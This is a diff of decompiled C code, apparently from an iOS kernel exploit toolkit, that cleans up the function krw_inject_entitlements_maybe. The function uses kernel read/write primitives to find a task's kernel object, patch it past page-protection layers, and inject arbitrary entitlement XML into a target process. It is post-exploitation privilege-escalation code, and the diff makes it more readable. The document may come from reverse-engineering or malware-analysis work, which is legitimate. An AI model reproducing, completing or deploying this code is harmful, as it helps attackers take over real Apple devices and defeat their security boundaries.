@@ -87,6 +87,30 @@ typedef struct PgtableWalkInfo
   uint64_t descriptor;
 } PgtableWalkInfo;
 
+typedef struct EntitlementFindConnectArgs
+{
+  uint64_t krwCtx;
+  uint32_t task;
+  uint32_t reserved0;
+  CFTypeRef *cfOut;
+  uint32_t ok;
+  uint32_t reserved1;
+} EntitlementFindConnectArgs;
+
+typedef struct EntitlementIokitPayload
+{
+  uint64_t krwCtx;
+  uint32_t task;
+  uint32_t reserved;
+  CFTypeRef cf;
+} EntitlementIokitPayload;
+
+typedef struct EntitlementIokitThreadArg
+{
+  EntitlementIokitPayload *payload;
+  int status;
+} EntitlementIokitThreadArg;
+
 //----- (00000000000068F4) ----------------------------------------------------
 void __fastcall deallocate_physmap_pages(__int64 a1)
 {
@@ -10048,168 +10072,152 @@ bool check_root_is_apfs()
 //----- (000000000001503C) ----------------------------------------------------
 __int64 __fastcall krw_inject_entitlements_maybe(struct_krwCtx *krwCtx, __int64 task, char *entitlementXml)
 {
-  int v4; // w23
-  uint64_t v7; // x24
-  void *v8; // x22
-  CFPropertyListRef v9; // x21
-  const struct __CFData *v10; // x20
-  size_t v11; // x0
-  void *(__cdecl *v12)(void *); // x0
-  const struct __CFData *Data; // x0
-  const struct __CFData *v14; // x23
-  size_t Length; // x24
-  const UInt8 *BytePtr; // x0
-  int v17; // w0
-  unsigned int v18; // w0
-  mach_port_name_t v19; // w23
-  int v20; // w8
-  unsigned __int64 v21; // x0
-  int v22; // w23
+  uint32_t targetTask; // w23
+  uint64_t ok; // x24
+  void *entitlementXmlBuffer; // x22
+  CFPropertyListRef entitlementDict; // x21
+  const struct __CFData *entitlementData; // x20
   CFPropertyListFormat format; // [xsp+8h] [xbp-108h] BYREF
-  CFTypeRef cf; // [xsp+10h] [xbp-100h] BYREF
-  __int64 address; // [xsp+18h] [xbp-F8h] BYREF
-  int v26; // [xsp+20h] [xbp-F0h]
-  CFTypeRef v27; // [xsp+28h] [xbp-E8h]
-  mach_port_name_t name[2]; // [xsp+30h] [xbp-E0h] BYREF
-  int v29; // [xsp+38h] [xbp-D8h]
-  pthread_t v30; // [xsp+40h] [xbp-D0h] BYREF
-  pthread_attr_t v31; // [xsp+48h] [xbp-C8h] BYREF
+  CFTypeRef serviceEntitlements; // [xsp+10h] [xbp-100h] BYREF
+  EntitlementIokitPayload iokitPayload; // [xsp+18h] [xbp-F8h] BYREF
+  EntitlementIokitThreadArg iokitThreadArg; // [xsp+30h] [xbp-E0h] BYREF
+  pthread_t thread; // [xsp+40h] [xbp-D0h] BYREF
+  pthread_attr_t attr; // [xsp+48h] [xbp-C8h] BYREF
 
-  v4 = task;
+  targetTask = task;
   format = kCFPropertyListXMLFormat_v1_0;
-  cf = 0;
-  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
+  serviceEntitlements = 0;
+  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
+    return krw_inject_entitlements2_maybe(krwCtx, task, entitlementXml, 1);
+
+  ok = 0;
+  if ( (unsigned int)acquire_write_semaphore_lock(krwCtx, 0, 0x2710u) )
+    return ok;
+
+  entitlementXmlBuffer = 0;
+  entitlementDict = 0;
+  entitlementData = 0;
+  EntitlementFindConnectArgs findArgs = {
+    .krwCtx = (uint64_t)krwCtx,
+    .task = targetTask,
+    .reserved0 = 0,
+    .cfOut = &serviceEntitlements,
+    .ok = 0,
+    .reserved1 = 0,
+  };
+
+  if ( !pthread_create_and_join(krwCtx, (__int64)find_connect_ioavservice, &findArgs) )
+    goto cleanup;
+  if ( !findArgs.ok )
+    goto cleanup;
+
+  entitlementData = CFDataCreateWithBytesNoCopy(
+                      kCFAllocatorDefault,
+                      (const UInt8 *)entitlementXml,
+                      strlen(entitlementXml) + 1,
+                      kCFAllocatorNull);
+  if ( !entitlementData )
+    goto cleanup;
+
+  entitlementDict = CFPropertyListCreateWithData(kCFAllocatorDefault, entitlementData, 0, &format, 0);
+  if ( !entitlementDict )
+    goto cleanup;
+
+  if ( (unsigned int)merge_cfdict_entries(serviceEntitlements, entitlementDict) )
   {
-    v7 = 0;
-    if ( (unsigned int)acquire_write_semaphore_lock(krwCtx, 0, 0x2710u) )
-      return v7;
-    v31.__sig = krwCtx;
-    *(uint32_t *)&v31.__opaque[4] = 0;
-    *(uint32_t *)v31.__opaque = v4;
-    *(uint64_t *)&v31.__opaque[8] = &cf;
-    *(uint64_t *)&v31.__opaque[16] = 0;
-    v7 = 0;
-    v8 = 0;
-    if ( pthread_create_and_join(krwCtx, (__int64)find_connect_ioavservice, &v31) )
+    if ( (unsigned int)compare_cfdict_entries(serviceEntitlements, entitlementDict) )
+      goto cleanup;
+
+    bool useIokitWorker = krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(7195, 42, 1, 0, 0)
+                       && (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0;
+    if ( useIokitWorker )
     {
-      v9 = 0;
-      v10 = 0;
-      if ( *(uint32_t *)&v31.__opaque[16] )
+      iokitPayload.krwCtx = (uint64_t)krwCtx;
+      iokitPayload.task = targetTask;
+      iokitPayload.reserved = 0;
+      iokitPayload.cf = serviceEntitlements;
+      if ( pthread_attr_init(&attr) )
+        goto cleanup;
+      if ( pthread_attr_setdetachstate(&attr, 1) )
       {
-        v11 = strlen(entitlementXml);
-        v10 = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault, (const UInt8 *)entitlementXml, v11 + 1, kCFAllocatorNull);
-        if ( !v10 )
-        {
-          v8 = 0;
-          v9 = 0;
-          goto LABEL_15;
-        }
-        v9 = CFPropertyListCreateWithData(kCFAllocatorDefault, v10, 0, &format, 0);
-        if ( !v9 )
-          goto LABEL_12;
-        if ( (unsigned int)merge_cfdict_entries(cf, v9) )
-        {
-          if ( (unsigned int)compare_cfdict_entries(cf, v9) )
-          {
-LABEL_12:
-            v8 = 0;
-            goto LABEL_15;
-          }
-          if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(7195, 42, 1, 0, 0) && (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
-          {
-            address = krwCtx;
-            v26 = v4;
-            v27 = cf;
-            if ( pthread_attr_init(&v31) )
-              goto LABEL_12;
-            if ( pthread_attr_setdetachstate(&v31, 1)
-              || (v30 = 0,
-                  v29 = 4097,
-                  *(uint64_t *)name = &address,
-                  v12 = (void *(__cdecl *)(void *))nullsub_1(get_kernel_task_iokit),
-                  pthread_create(&v30, &v31, v12, name))
-              || pthread_join(v30, 0) )
-            {
-              pthread_attr_destroy(&v31);
-              goto LABEL_12;
-            }
-            v22 = v29;
-            pthread_attr_destroy(&v31);
-            v8 = 0;
-            if ( v22 )
-              goto LABEL_15;
-          }
-          else
-          {
-            Data = CFPropertyListCreateData(kCFAllocatorDefault, cf, kCFPropertyListXMLFormat_v1_0, 0, 0);
-            if ( !Data )
-              goto LABEL_12;
-            v14 = Data;
-            Length = CFDataGetLength(Data);
-            v8 = calloc(Length + 1, 1u);
-            if ( !v8 )
-            {
-              CFRelease(v14);
-              goto LABEL_15;
-            }
-            BytePtr = CFDataGetBytePtr(v14);
-            memcpy(v8, BytePtr, Length);
-            CFRelease(v14);
-            name[0] = 0;
-            address = 0;
-            v17 = strlen((const char *)v8);
-            v18 = register_ioservice_publish_notify((__int64)v8, v17 + 1, name);
-            if ( v18 + 1 <= 1 )
-            {
-LABEL_15:
-              v7 = 0;
-              goto LABEL_16;
-            }
-            v19 = v18;
-            v20 = krwCtx->xnuMajorVersion;
-            v7 = ((unsigned int)(v20 - 8019) < 2 || v20 == 7195 || v20 == 6153)
-              && (v21 = get_task_kobject_addr(krwCtx, v18), (address = v21) != 0)
-              && kread_physmap_decorated(krwCtx, v21 + 16, (unsigned __int64 *)&address)
-              && kread_physmap_decorated(krwCtx, address + 24, (unsigned __int64 *)&address)
-              && noppl_kwrite32(krwCtx, address + krwCtx->stride_0x168, 255)
-              && (unsigned int)krw_read_thunk(krwCtx, address, 40, &v31)
-              && (unsigned int)kwrite_with_retry(
-                                 krwCtx,
-                                 krwCtx->gap_0x390 + krwCtx->stride_0x168,
-                                 (__int64)&v31 + krwCtx->stride_0x168,
-                                 (unsigned int)(40 - krwCtx->stride_0x168)) != 0;
-            mach_port_destroy(mach_task_self_, v19);
-            if ( name[0] + 1 >= 2 )
-              mach_port_destroy(mach_task_self_, name[0]);
-            if ( !v7 )
-              goto LABEL_16;
-          }
-        }
-        else
-        {
-          v8 = 0;
-        }
-        v7 = 1;
+        pthread_attr_destroy(&attr);
+        goto cleanup;
       }
+      thread = 0;
+      iokitThreadArg.payload = &iokitPayload;
+      iokitThreadArg.status = 4097;
+      void *(__cdecl *worker)(void *) = (void *(__cdecl *)(void *))nullsub_1(get_kernel_task_iokit);
+      if ( pthread_create(&thread, &attr, worker, &iokitThreadArg) || pthread_join(thread, 0) )
+      {
+        pthread_attr_destroy(&attr);
+        goto cleanup;
+      }
+      int workerStatus = iokitThreadArg.status;
+      pthread_attr_destroy(&attr);
+      if ( workerStatus )
+        goto cleanup;
     }
     else
     {
-      v9 = 0;
-      v10 = 0;
+      const struct __CFData *serializedEntitlements =
+        CFPropertyListCreateData(kCFAllocatorDefault, serviceEntitlements, kCFPropertyListXMLFormat_v1_0, 0, 0);
+      if ( !serializedEntitlements )
+        goto cleanup;
+      size_t serializedLength = CFDataGetLength(serializedEntitlements);
+      entitlementXmlBuffer = calloc(serializedLength + 1, 1u);
+      if ( !entitlementXmlBuffer )
+      {
+        CFRelease(serializedEntitlements);
+        goto cleanup;
+      }
+      memcpy(entitlementXmlBuffer, CFDataGetBytePtr(serializedEntitlements), serializedLength);
+      CFRelease(serializedEntitlements);
+
+      mach_port_name_t previousNotify = 0;
+      unsigned __int64 taskKaddr = 0;
+      unsigned int notifyPort = register_ioservice_publish_notify(
+                                  (__int64)entitlementXmlBuffer,
+                                  strlen((const char *)entitlementXmlBuffer) + 1,
+                                  &previousNotify);
+      if ( notifyPort + 1 <= 1 )
+        goto cleanup;
+
+      int major = krwCtx->xnuMajorVersion;
+      ok = ((unsigned int)(major - 8019) < 2 || major == 7195 || major == 6153)
+        && (taskKaddr = get_task_kobject_addr(krwCtx, notifyPort)) != 0
+        && kread_physmap_decorated(krwCtx, taskKaddr + 16, &taskKaddr)
+        && kread_physmap_decorated(krwCtx, taskKaddr + 24, &taskKaddr)
+        && noppl_kwrite32(krwCtx, taskKaddr + krwCtx->stride_0x168, 255);
+      if ( ok )
+      {
+        uint8_t entitlementSnapshot[40];
+        ok = (unsigned int)krw_read_thunk(krwCtx, taskKaddr, sizeof(entitlementSnapshot), entitlementSnapshot)
+          && (unsigned int)kwrite_with_retry(
+                              krwCtx,
+                              krwCtx->gap_0x390 + krwCtx->stride_0x168,
+                              (__int64)entitlementSnapshot + krwCtx->stride_0x168,
+                              (unsigned int)(sizeof(entitlementSnapshot) - krwCtx->stride_0x168)) != 0;
+      }
+      mach_port_destroy(mach_task_self_, notifyPort);
+      if ( previousNotify + 1 >= 2 )
+        mach_port_destroy(mach_task_self_, previousNotify);
+      if ( !ok )
+        goto cleanup;
     }
-LABEL_16:
-    release_write_semaphore_lock(krwCtx, 0);
-    if ( cf )
-      CFRelease(cf);
-    if ( v9 )
-      CFRelease(v9);
-    if ( v10 )
-      CFRelease(v10);
-    if ( v8 )
-      free(v8);
-    return v7;
   }
-  return krw_inject_entitlements2_maybe(krwCtx, task, entitlementXml, 1);
+  ok = 1;
+
+cleanup:
+  release_write_semaphore_lock(krwCtx, 0);
+  if ( serviceEntitlements )
+    CFRelease(serviceEntitlements);
+  if ( entitlementDict )
+    CFRelease(entitlementDict);
+  if ( entitlementData )
+    CFRelease(entitlementData);
+  if ( entitlementXmlBuffer )
+    free(entitlementXmlBuffer);
+  return ok;
 }
 // 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);
 
